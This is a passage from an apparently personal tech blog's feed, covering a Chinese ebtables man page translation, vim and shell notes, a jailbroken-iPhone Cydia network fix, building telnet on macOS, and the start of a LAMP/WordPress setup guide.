以文件的方式做列表</p><p>–among-src-file [!] <em>file</em></p><p><strong>arp</strong></p><p>指定 (R)ARP 类型的包，前提是协议必须设置为 ARP 或 RARP</p><p>–arp-opcode [!] <em>opcode</em>   (R)ARP 的操作码（十六进制或字符串，查看帮助 <strong>ebtables -h arp</strong>）</p><p>–arp-htype [!] <em>hardware type</em>   硬件类型，可以是十六进制或字符串 “<em>Ethernet</em>“ (它的类型是1)。大多数的 (R)ARP 包都是以 <em>Ethernet</em> 作为硬件类型</p><p>–arp-ptype [!] <em>protocol type</em>   (R)ARP 所使用的协议类型，为十六进制或字符串 “<em>IPv4</em>“ (其表示为 <strong>0x0800</strong> )。大多数(R)ARP包都是 IPv4</p><p>–arp-ip-src [!] <em>address[/mask]</em>   指定 (R)ARP 的源IP地址</p><p>–arp-ip-des [!]  <em>address[/mask]</em>   目的IP地址</p><p>–arp-mac-des [!]  <em>address[/mask]</em>   目的MAC地址</p><p>–arp-mac-src [!]  <em>address[/mask]</em>   源MAC地址</p><p>[!] –arp-gratuitous   Checks for ARP gratuitous packets: checks equality of IPv4 source address and IPv4 destination address inside the ARP header</p><p><strong>ip</strong></p><p>指定 IPv4 类型的包，协议必须为 IPv4</p><p>–ip-source [!] <em>address[/mask]</em>   =====&gt; <em>–ip-src</em>   源IP地址</p><p>–ip-destination [!] <em>address[/mask]</em>   =====&gt; <em>–ip-dst</em>   目的IP地址</p><p>–ip-tos [!] <em>tos</em>    (type of service) =====&gt; 十六进制数 或 <strong>IPv4</strong></p><p>–ip-protocol [!] <em>protocol</em>   =====&gt; <em>–ip-proto</em>   指明协议</p><p>–ip-source-port [!] <em>prot1[:port2]</em>   =====&gt; <em>–ip-src</em>   源端口或端口范围：6(TCP) , 17(UDP) , 33(DCCP) , 132(SCTP) ，必须设定<code>--ip-protocol</code> 字段为对应协议；如果 <em>port1</em> 被省略了，那么代表0:port2；如果<em>port2</em> 被省略了，代表port1:65535；=====&gt; <em>–ip-sport</em></p><p>–ip-destination-port [!] <em>prot1[:port2]</em>  同上 =====&gt; <em>–ip-dport</em></p><p><strong>limit</strong></p><p><strong>vlan</strong></p><p>指定 802.1Q 标签控制信息（Tag Control Information） 字段。协议必须指定为 802_1Q(0x8100)</p><p>–vlan-id [!] <em>id</em>    指定 VLAN 的标识符 (identifier filed, VID)，十进制数 0-4095</p><p>–vlan-prio [!] <em>prio</em>   用户优先级域，十进制 0-7，VID 必须设置为 0 （“null VID”）或者不指定。</p><p>–vlan-encap [!] <em>type</em>   被封装后的以太网帧的长度（也就是类型），为从0x0000 到 0xFFFF的十六进制数，或者在<code>/etc/ethertypes</code> 文件中的字符串</p><h3 id="观察者扩展-WATCHER-EXTENSIONS"><a href="#观察者扩展-WATCHER-EXTENSIONS" class="headerlink" title="观察者扩展 WATCHER EXTENSIONS"></a>观察者扩展 WATCHER EXTENSIONS</h3><p>只向日志文件中记录通过的帧，不能进行操作</p><p><strong>log</strong></p><p>log 观察者只向 syslog 写入帧的描述性数据</p><p>–log 默认选项，采用<code>log-level=info,log-prefix=&quot;&quot;</code>设置，且不记录ip，不记录arp</p><p>–log-level <em>level</em>   设置日志（记录）等级，参考<strong>ebtables -h log</strong> ，默认为 <em>info</em></p><p>–log-prefix <em>text</em>   记录条目的前缀，方便查看记录文件的时候快速识别出哪些来自 ebtables</p><p>–log-ip   当带有ip协议的帧匹配到规则时会记录ip</p><p>–log-ip6</p><p>–log-arp   当带有 (r)arp 协议的帧匹配到规则的时候，记录arp信息</p><p><strong>nflog</strong></p><p>nflog 观察者会传递匹配的包给一个后台运行的进程（loaded loggin backend）来记录数据包。通常这个后端程序为 <code>nfnetlink_log</code> , 这个后端程序会通过 <em>netlink</em> 套接字（socket）向多播组内多播接受到底数据包（帧）。而且一个或多个用户空间的进程可以加入该多播组从而收到这些包。</p><p>–nflog    用默认设置记录</p><p>–nflog-group <em>nlgroup</em>   数据包所属的 netlink 组(1 - 2^32-1)(仅适用于nfnetlink_log)。默认为1</p><p>–nflog-prefix <em>prefix</em>   记录日志的前缀，同上文，最长30个字符</p><p>–nflog-range <em>size</em>   规定多少字节被拷贝到用户空间（只对nfnetlink_log有效），且一般 nfnetlink_log 实例会指定自己的范围，这个选项会覆盖那个选项。</p><p>–nflog-threshold <em>size</em>    发送到用户空间之前要在内核中排队的包的数量 (仅适用于nfnetlink_log)。值越大，每个包的开销就越少，但是会增加延迟，直到包到达用户空间。默认值是1。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ulog - 未翻译</span><br></pre></td></tr></table></figure><h3 id="目标扩展-TARGET-EXTENSIONS"><a href="#目标扩展-TARGET-EXTENSIONS" class="headerlink" title="目标扩展 TARGET EXTENSIONS"></a>目标扩展 TARGET EXTENSIONS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arpreply - 未翻译</span><br><span class="line">mark - 未翻译</span><br></pre></td></tr></table></figure><p><strong>dnat</strong></p><p>该动作(target)只能用在 BROUTING 链，和 nat 表的 PREROUTING、OUTPUT链。指定了目的MAC地址必须要被改变</p><p>–to-destination <em>address</em>   =====&gt; <strong>–to-dst</strong></p><p>–dnat-target <em>target</em>   指定了标准动作（target）。因为在 dnat 后 ebtables 还需要知道怎么处理一个被 dnated 的帧，默认是 <strong>ACCEPT</strong>， 将其设置为 <strong>CONTINUE</strong> 可以让你在同一个帧上使用多个动作扩展（multiple target extensions)。设置为 <strong>DROP</strong> 只在 BROUTING 链中有用，当然此时还不如用 redirect 更合理呢。还可以设置为 <strong>RETURN</strong> ，注意在 基础链（base chain，应该指的是最开头的链，因为内核不知道还往哪里返回了！）中使用 RETURN 是不允许的。</p><p><strong>redirect</strong></p><p>重定向目标（target，或译为动作）将把MAC目标地址更改为帧到达的桥接设备的目标地址。此 target 只能在broute表的BROUTING链和nat表的PREROUTING链中使用。在BROUTING链中，使用桥端口的MAC地址作为目标地址，在PREROUTING链中使用桥的MAC地址。</p><p>–redirect-target <em>target</em>   指定标准target。在MAC重定向之后，规则仍然必须给出一个标准目标，以便ebtables知道该做什么。默认目标是ACCEPT。而使用 CONTINUE 可以让您在同一帧上使用多个目标扩展。在BROUTING 链上使用 DROP 会让帧被路由。也允许使用 RETURN。注意，不允许在基链中使用RETURN。</p><p><strong>snat</strong></p><p>这个动作只能被用在 nat 表的 POSTROUTING 链，它指定源MAC地址必须被改变</p><p>–to-source <em>address</em>    =====&gt; <strong>–to-src</strong></p><p>–snat-target <em>target</em>    指定一个标准动作，除了不能使用 DROP 之外，其余与上文一样</p><p>–snat-arp    如果包是arp消息，并且arp头中的硬件地址长度为6字节，那么还需要更改arp头中的硬件源地址。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;以下内容来自 Man Page&lt;/p&gt;
&lt;h3 id=&quot;用法&quot;&gt;&lt;a href=&quot;#用法&quot; class=&quot;headerlink&quot; title=&quot;用法&quot;&gt;&lt;/a&gt;用法&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;ebtables&lt;/strong&gt; [&lt;strong&gt;-t&lt;/strong&gt; 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>iptables</title>
    <link href="https://r0sev.github.io/2019/04/30/iptables/"/>
    <id>https://r0sev.github.io/2019/04/30/iptables/</id>
    <published>2019-04-29T16:02:46.000Z</published>
    <updated>2019-04-29T16:04:31.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="有关iptables的好文，推荐"><a href="#有关iptables的好文，推荐" class="headerlink" title="有关iptables的好文，推荐"></a>有关iptables的好文，推荐</h2><p>原文地址：<code>http://www.zsythink.net/archives/tag/iptables/page/2/</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;有关iptables的好文，推荐&quot;&gt;&lt;a href=&quot;#有关iptables的好文，推荐&quot; class=&quot;headerlink&quot; title=&quot;有关iptables的好文，推荐&quot;&gt;&lt;/a&gt;有关iptables的好文，推荐&lt;/h2&gt;&lt;p&gt;原文地址：&lt;code&gt;htt
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Shell Usage</title>
    <link href="https://r0sev.github.io/2019/04/22/Shell-Usage/"/>
    <id>https://r0sev.github.io/2019/04/22/Shell-Usage/</id>
    <published>2019-04-22T14:26:41.000Z</published>
    <updated>2019-04-22T14:31:10.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-How-to-use-‘vim’"><a href="#0x01-How-to-use-‘vim’" class="headerlink" title="0x01 How to use ‘vim’"></a>0x01 How to use ‘vim’</h2><h3 id="1-Edit-Mode"><a href="#1-Edit-Mode" class="headerlink" title="1. Edit Mode"></a>1. Edit Mode</h3><ul><li>using ‘a’ ‘A’ ‘o’ ‘O’ ‘i’ ‘I’ ‘r’ ‘R’ to enable this mode</li></ul><h3 id="2-Command-Mode"><a href="#2-Command-Mode" class="headerlink" title="2. Command Mode"></a>2. Command Mode</h3><ul><li>‘:’ ‘/‘ ‘?’ </li></ul><h3 id="3-Using-‘wq-’-to-save-file-compulsively"><a href="#3-Using-‘wq-’-to-save-file-compulsively" class="headerlink" title="3. Using ‘wq!’ to save file compulsively"></a>3. Using ‘wq!’ to save file compulsively</h3><h3 id="4-Some-commen-fast-key-in-daily-life"><a href="#4-Some-commen-fast-key-in-daily-life" class="headerlink" title="4. Some commen fast-key in daily life"></a>4. Some commen fast-key in daily life</h3><ol><li><code>ctrl + f</code> : move to next page(screen)</li><li><code>ctrl + b</code> : move to previous page(screen)</li><li><code>ctrl + d</code> : move to next half page</li><li><code>ctrl + u</code> : </li><li><code>+</code> : next line <code>-</code> : previous line</li><li><code>num&lt;space&gt;</code> : to ‘num’- th character of THIS line</li><li><code>0</code> : to the head of THIS line</li><li><code>$</code> : to the tail of THIS line</li><li><code>H</code> or <code>M</code> or <code>L</code> : to the head of this screen ; to the middle of this screen ; to the lowest of this screen</li><li><code>nG</code> : to the ‘n’ line of this FILE</li><li><code>N&lt;enter&gt;</code> : move down N lines of  the mouse</li><li><code>?keyword:</code>  :  find the word ‘keyword’ upward from THERE</li><li><code>:n1,n2s/old/new/g</code>  : find and replace between line ‘n1’ and line ‘n2’</li><li><code>:1,$s/old/new/g</code>  : find and replace from 1st line to the last one</li><li>``:1,$s/old/new/gc`  : find and replace from 1st line to the last one and every one needs to CONFIRM</li><li><code>nx</code> or <code>nX</code>  : delete n character</li><li><code>d1G</code> : delete TO 1st line from THERE</li><li><code>dG</code> : delete TO final line from THERE</li><li><code>d$</code> : delete TO the tail of THIS line</li><li><code>d0</code> : delete TO the head of THIS line</li><li><code>nyy</code> : copy n line</li><li><code>y1G</code></li><li><code>yG</code></li><li><code>y$</code></li><li><code>y0</code></li><li><code>J</code> : combine THIS line and NEXT line</li><li><code>Ctrl + r</code> or <code>.</code> : repeat the action again</li><li><code>:w filename</code> : save file to a newfile</li><li><code>:r filename</code> : copy the content of ‘filename’ next to where the curse is</li><li><code>:n1,n2 w filename</code> : save content of line n1 TO n2 to a newfile</li><li><code>:! commnad</code> : runing shell command in vim</li><li><code>:set nonu</code> : CANCEL showing line number</li></ol><h3 id="5-About-Unusual-Quit-of-vim"><a href="#5-About-Unusual-Quit-of-vim" class="headerlink" title="5. About Unusual Quit of vim"></a>5. About Unusual Quit of vim</h3><ul><li>You should delete file <code>.file.swp</code> manually after Recover From this file!</li></ul><h2 id="0x02-Frequently-used-commands"><a href="#0x02-Frequently-used-commands" class="headerlink" title="0x02 Frequently used commands"></a>0x02 Frequently used commands</h2><h3 id="1-alias"><a href="#1-alias" class="headerlink" title="1. alias"></a>1. alias</h3><h3 id="2-Visual-Block"><a href="#2-Visual-Block" class="headerlink" title="2. Visual Block"></a>2. Visual Block</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.1    host1.class.net</span><br><span class="line">192.168.1.2    host2.class.net</span><br><span class="line">192.168.1.3    host3.class.net</span><br><span class="line">192.168.1.4    host4.class.net</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Important Keys:</p><p><code>v</code>  choose characters</p><p><code>V</code>  choose lines</p><p><code>ctrl + v</code> choose rectangle area</p><p><code>y</code>  copy</p><p><code>d</code>  delete</p><p><strong>For instance : Try to copy ‘ hostn  ‘ to the area behine ‘ .net ‘  like this</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.1    host1.class.nethost1</span><br><span class="line">192.168.1.2    host2.class.nethost2</span><br><span class="line">192.168.1.3    host3.class.nethost3</span><br><span class="line">192.168.1.4    host4.class.nethost4</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>You can follow the steps:</p><ol><li>move curse to ‘h’ of ‘host1’</li><li>Press <code>ctrl v</code></li><li>move curse to 4 of ‘host4’</li><li>press <code>y</code></li><li>and move curse to the 1st line’s tail</li><li>press <code>p</code></li></ol><h3 id="3-Multi-files-editing"><a href="#3-Multi-files-editing" class="headerlink" title="3. Multi files editing"></a>3. Multi files editing</h3><ol><li>using <code>vim file1 file2</code> to open two files</li><li><code>:n</code> to edit the next file and <code>:N</code> to edit the previous one</li><li><code>:files</code> to see how many files you have opened</li><li>BTW: you can use <code>yy</code> and <code>p</code> between those 2 files!</li></ol><h3 id="4-Using-multi-windows-of-vim"><a href="#4-Using-multi-windows-of-vim" class="headerlink" title="4. Using multi windows of vim"></a>4. Using multi windows of vim</h3><ol><li>open a file</li><li>using <code>:sp</code> to split a window for itself</li><li>using <code>:sp file2</code> to put file2 underneath file1</li><li>Move curse between two windows:<ol><li>ctrl w j : move down</li><li>ctrl w k : move up</li><li>ctrl w q : quit an window</li></ol></li></ol><h3 id="5-Configuration-file-of-vim"><a href="#5-Configuration-file-of-vim" class="headerlink" title="5. Configuration file of vim"></a>5. Configuration file of vim</h3><ol><li><code>.vimrc</code> : default settings</li><li><code>.viminfo</code>: operation history</li><li>changing settings of vim:<ol><li>using <code>:set xxx</code> directly in vim to temporarily changing the settings</li><li>edit ‘.vimrc’ file to modify default settings</li><li>some examples:</li></ol></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">:set nu/nonu</span><br><span class="line">:set hlsearch/nohlsearch</span><br><span class="line">:set backup</span><br><span class="line">:set showmode;;aka showing &apos;--INSERT--&apos; or &apos;--REPLACE--&apos;</span><br><span class="line">:set backspace=0/1/2</span><br><span class="line">:set all</span><br><span class="line">:syntax on/off</span><br><span class="line">:set bg=dark/light</span><br><span class="line">:set autoindent</span><br></pre></td></tr></table></figure><h3 id="6-About-encoding-problem"><a href="#6-About-encoding-problem" class="headerlink" title="6. About encoding problem"></a>6. About encoding problem</h3><ul><li><p>reference : <code>iconv</code> command</p></li><li><p>for instance:</p><ul><li>file1(encoding: <strong>big5</strong>) -&gt; file1.utf8(encoding: <strong>utf8</strong>) , you can do this:</li><li><code>iconv -f big5 -t utf8 file1 -o file1.utf8</code></li></ul></li></ul><h2 id="0x03-Something-about-Shell"><a href="#0x03-Something-about-Shell" class="headerlink" title="0x03 Something about Shell"></a>0x03 Something about Shell</h2><h3 id="1-builtin-commands"><a href="#1-builtin-commands" class="headerlink" title="1. builtin commands:"></a>1. builtin commands:</h3><ol><li><code>type</code> : <code>type ls</code> may be == <code>which ls</code></li><li><code>cd</code></li></ol><h3 id="2-some-truth-of-variables"><a href="#2-some-truth-of-variables" class="headerlink" title="2. some truth of variables"></a>2. some truth of variables</h3><ol><li>“this is $var” <strong>not equals to</strong>  ‘this is $var’</li><li>`command` <strong>is equal to</strong> <code>$(command)</code></li><li><code>export</code> can create a <strong>global variable</strong></li><li>the funny use of `command` : <code>cd /lib/modules/$(uname -r)/kernel</code></li><li>you can define a work directory which name is very long to a <strong>variable</strong>: <code>[root@~ ]$ work=/a/b/c/d/e/</code>  and <code>cd $work</code></li><li>using <code>env</code> to show <strong>global variables</strong></li><li>using <code>set</code> to show <strong>all variables</strong></li><li>actually, <strong>PS1=’[\u@\h \W]$‘</strong> and <strong>PS2=’&gt; ‘</strong><ol><li><code>\h</code> : host</li><li><code>\d</code> : like “Mon Feb 2”</li><li><code>\H</code> : whole hostname</li><li><code>\t</code> : 24hours</li><li><code>\T</code> : 12hours</li><li><code>\u</code> : username</li><li><code>\v</code> : version of Bash</li><li><code>\W</code> : whole name of directory, form ‘/‘</li><li><code>\w</code>: dir name</li><li><code>\$</code> : root:<strong>#</strong> and other:<strong>$</strong></li></ol></li><li>system language setting: <code>/etc/sysconfig/i18n</code></li><li><code>read</code> : get INPUT from user: <code>read -p &quot;Input Here: &quot;  var_name</code> or <code>read -p &quot;Input name: &quot; -t 20 name</code> then <code>echo $name</code></li><li><code>declare</code><ol><li>-a : declare an array</li><li>-x : declare a global variable</li><li>-i : declare an int value</li><li>-r : declare a readonly variable</li><li><code>declare -i sum=10+10+10</code> ==&gt; 30</li><li><code>declare -x sum</code> change <strong>sum</strong> to global; <code>declare +x sum</code> change <strong>sum</strong> to normal variable</li><li>using <code>declare -p var</code> to see var’s type</li></ol></li></ol><h3 id="3-some-wired-commands-I-dont-need-them-for-now"><a href="#3-some-wired-commands-I-dont-need-them-for-now" class="headerlink" title="3. some wired commands , I dont need them , for now."></a>3. some wired commands , I dont need them , for now.</h3><ol><li><code>ulimit</code></li><li><code>dd</code></li><li><code>unalias</code></li></ol><h3 id="4-modify-the-content-of-variable"><a href="#4-modify-the-content-of-variable" class="headerlink" title="4. modify the content of variable"></a>4. modify the content of variable</h3><ol><li>${path#/*root/bin:}  =&gt; from <code>path</code> delete the SHORTEST  <code>/.....root/bin;</code> </li><li>${path##/*:} ==&gt; from <code>path</code> delete the LONGEST <code>/......;</code></li><li><code>%</code> and <code>%%</code> is just the same as <code>#</code> and <code>##</code> , however, # starts from head but % starts from tail</li><li>${path/old/new} ==&gt; for <strong>replace once</strong>  </li><li>${path//old/new} ==&gt; for <strong>replace all</strong>  </li><li>new_var=${old_var-content}, if old_var is null then new_var equals = content else new_var = old_var</li><li><code>-</code> <code>:-</code>   if old_var is nul or old_var=””  then new_var equals = content else new_var = old_var</li><li><code>+</code>  <code>:+</code></li><li><code>=</code> <code>:=</code></li><li><code>?</code> <code>:?</code></li><li>In Shell:<ol><li>!!                         :reapeat the last command</li><li>!command       : search command in history</li><li>!number           :execute the number-th command in history</li></ol></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-How-to-use-‘vim’&quot;&gt;&lt;a href=&quot;#0x01-How-to-use-‘vim’&quot; class=&quot;headerlink&quot; title=&quot;0x01 How to use ‘vim’&quot;&gt;&lt;/a&gt;0x01 How to use ‘vim’&lt;/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Cydia 无法连接网络的处理</title>
    <link href="https://r0sev.github.io/2019/04/07/Cydia-%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E7%BD%91%E7%BB%9C%E7%9A%84%E5%A4%84%E7%90%86/"/>
    <id>https://r0sev.github.io/2019/04/07/Cydia-无法连接网络的处理/</id>
    <published>2019-04-07T13:16:03.000Z</published>
    <updated>2019-04-07T13:25:51.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="iPhone-越狱后-Cydia-商店无法加载网络"><a href="#iPhone-越狱后-Cydia-商店无法加载网络" class="headerlink" title="iPhone 越狱后 Cydia 商店无法加载网络"></a>iPhone 越狱后 Cydia 商店无法加载网络</h3><h4 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境:"></a>0x01 环境:</h4><ul><li>iPhone SE</li><li>OS: 11.4</li><li>Jailbreak Tools: unc0ver</li></ul><h4 id="0x02-原因分析"><a href="#0x02-原因分析" class="headerlink" title="0x02 原因分析:"></a>0x02 原因分析:</h4><p>​    国行手机比美版、港版、韩版手机新增了网络授权的功能，iOS 10 及以上系统版本，任何应用首次打开，如果有请求网络的行为，都会提示网络请求授权的对话框。首次打开 Cydia 并没有提示网络请求授权的对话框，这就是导致国行手机 Cydia 不能上网的原因。</p><h4 id="0x03-解决办法"><a href="#0x03-解决办法" class="headerlink" title="0x03 解决办法:"></a>0x03 解决办法:</h4><p>由于允许上网的应用列表信息保存在以下这几个文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/preferences/com.apple.networkextension.plist</span><br><span class="line">/var/preferences/com.apple.networkextension.cache.plist</span><br><span class="line">/var/preferences/com.apple.networkextension.necp.plist</span><br></pre></td></tr></table></figure><p>只要删除这些文件就不会有网络请求授权的问题。</p><h4 id="0x04-具体步骤"><a href="#0x04-具体步骤" class="headerlink" title="0x04 具体步骤:"></a>0x04 具体步骤:</h4><ol><li><p>在iPhone上打开科学上网功能，此时可以临时让 <code>Cydia</code> 使用网络并安装源</p></li><li><p>进入 <code>Cydia</code> ，添加威锋源( <a href="http://repo.feng.com" target="_blank" rel="noopener">http://repo.feng.com</a> )</p></li><li><p>搜索安装 <code>OpenSSH</code> 插件</p></li><li><p>使用PC或者Mac的ssh工具连接iPhone，默认 root 密码为<code>alpine</code></p></li><li><p>删除上述三个文件即可</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /var/preferences</span><br><span class="line">rm 三个文件</span><br></pre></td></tr></table></figure></li><li><p>别忘了修改 root 密码</p></li><li><p>此时关闭 科学上网 仍然可以使用 <code>Cydia</code> 了</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;iPhone-越狱后-Cydia-商店无法加载网络&quot;&gt;&lt;a href=&quot;#iPhone-越狱后-Cydia-商店无法加载网络&quot; class=&quot;headerlink&quot; title=&quot;iPhone 越狱后 Cydia 商店无法加载网络&quot;&gt;&lt;/a&gt;iPhone 越狱后 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>macOS 10.14.3 编译安装telnet工具</title>
    <link href="https://r0sev.github.io/2019/04/05/macOS-10-14-3-%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85telnet%E5%B7%A5%E5%85%B7/"/>
    <id>https://r0sev.github.io/2019/04/05/macOS-10-14-3-编译安装telnet工具/</id>
    <published>2019-04-05T14:48:54.000Z</published>
    <updated>2019-04-05T15:04:16.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前提"><a href="#0x01-前提" class="headerlink" title="0x01 前提"></a>0x01 前提</h3><p>Homebrew 实在是太慢，可以考虑使用privoxy转发代理到terminal使用，但是太麻烦，反正源码也不大，直接使用源码编译安装此时是比较合适的。</p><h3 id="0x02-开始下载并安装"><a href="#0x02-开始下载并安装" class="headerlink" title="0x02 开始下载并安装"></a>0x02 开始下载并安装</h3><ul><li><p>创建临时目录并下载至此</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir inetutils</span><br><span class="line">$ <span class="built_in">cd</span> inetutils</span><br><span class="line">$ curl https://ftp.gnu.org/gnu/inetutils/inetutils-1.9.4.tar.xz -O</span><br><span class="line">$ tar -zxvf inetutils-1.9.4.tar.xz</span><br><span class="line">$ <span class="built_in">cd</span> inetutils-1.9.4</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/Users/user_name/inetutils/inetutils-1.9.4</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>配置并编译安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./configure --prefix=/usr/<span class="built_in">local</span> --<span class="built_in">disable</span>-servers \</span><br><span class="line">--<span class="built_in">disable</span>-hostname --<span class="built_in">disable</span>-ping --<span class="built_in">disable</span>-ping6 \</span><br><span class="line">--<span class="built_in">disable</span>-logger --<span class="built_in">disable</span>-talk --<span class="built_in">disable</span>-tftp \</span><br><span class="line">--<span class="built_in">disable</span>-whois --<span class="built_in">disable</span>-ifconfig --<span class="built_in">disable</span>-traceroute</span><br><span class="line"></span><br><span class="line">$ make -j8</span><br><span class="line"></span><br><span class="line">$ sudo make install</span><br><span class="line">...input your password...</span><br></pre></td></tr></table></figure></li><li><p>此时便可以使用Telnet了</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-前提&quot;&gt;&lt;a href=&quot;#0x01-前提&quot; class=&quot;headerlink&quot; title=&quot;0x01 前提&quot;&gt;&lt;/a&gt;0x01 前提&lt;/h3&gt;&lt;p&gt;Homebrew 实在是太慢，可以考虑使用privoxy转发代理到terminal使用，但是太麻烦，
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux 内核代码风格规范</title>
    <link href="https://r0sev.github.io/2019/04/04/Linux-%E5%86%85%E6%A0%B8%E4%BB%A3%E7%A0%81%E9%A3%8E%E6%A0%BC%E8%A7%84%E8%8C%83/"/>
    <id>https://r0sev.github.io/2019/04/04/Linux-内核代码风格规范/</id>
    <published>2019-04-04T07:11:57.000Z</published>
    <updated>2019-04-04T08:14:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>详情:<a href="https://www.kernel.org/doc/html/latest/translations/zh_CN/coding-style.html" target="_blank" rel="noopener">Linux 内核代码风格 - The Linux Kernel Documentation</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">中文版维护者： 张乐 Zhang Le &lt;r0bertz@gentoo.org&gt;</span><br><span class="line">中文版翻译者： 张乐 Zhang Le &lt;r0bertz@gentoo.org&gt;</span><br><span class="line">中文版校译者： 王聪 Wang Cong &lt;xiyou.wangcong@gmail.com&gt;</span><br><span class="line">               wheelz &lt;kernel.zeng@gmail.com&gt;</span><br><span class="line">               管旭东 Xudong Guan &lt;xudong.guan@gmail.com&gt;</span><br><span class="line">               Li Zefan &lt;lizf@cn.fujitsu.com&gt;</span><br><span class="line">               Wang Chen &lt;wangchen@cn.fujitsu.com&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;详情:&lt;a href=&quot;https://www.kernel.org/doc/html/latest/translations/zh_CN/coding-style.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Linux 内核代码风格 - Th
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LAMP环境与WordPress博客的搭建</title>
    <link href="https://r0sev.github.io/2019/03/20/LAMP%E7%8E%AF%E5%A2%83%E4%B8%8EWordPress%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>https://r0sev.github.io/2019/03/20/LAMP环境与WordPress博客的搭建/</id>
    <published>2019-03-20T09:01:11.000Z</published>
    <updated>2019-04-04T08:17:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-查看是否存在残余的版本并卸载之"><a href="#0x01-查看是否存在残余的版本并卸载之" class="headerlink" title="0x01 查看是否存在残余的版本并卸载之"></a>0x01 查看是否存在残余的版本并卸载之</h1><h2 id="检查Apache"><a href="#检查Apache" class="headerlink" title="检查Apache"></a>检查Apache</h2><p><code>rpm -qa | grep httpd*</code></p><h2 id="检查PHP"><a href="#检查PHP" class="headerlink" title="检查PHP"></a>检查PHP</h2><p><code>rpm -qa | grep php*</code></p><h2 id="检查MySQL"><a href="#检查MySQL" class="headerlink" title="检查MySQL"></a>检查MySQL</h2><p><code>rpm -qa | grep mysql*</code><br><code>rpm -qa | grep mariadb*</code></p><h2 id="结果：没有"><a href="#结果：没有" class="headerlink" title="结果：没有"></a>结果：没有</h2><h2 id="如果有剩余版本：使用-rpm-e-nodeps-xxx-一个个卸载即可"><a href="#如果有剩余版本：使用-rpm-e-nodeps-xxx-一个个卸载即可" class="headerlink" title="如果有剩余版本：使用 rpm -e --nodeps xxx 一个个卸载即可"></a>如果有剩余版本：使用 <code>rpm -e --nodeps xxx</code> 一个个卸载即可</h2><h1 id="0x02-开始安装LAMP-与配置"><a href="#0x02-开始安装LAMP-与配置" class="headerlink" title="0x02 开始安装LAMP [与配置]"></a>0x02 开始安装LAMP [与配置]</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li><p>关闭SELinux</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/selinux/config</span><br><span class="line"># SELINUX=enforcing# 添加注释</span><br><span class="line"># SELINUXTYPE=targeted</span><br><span class="line">SELINUX=disabled# 增加一行</span><br></pre></td></tr></table></figure><p>  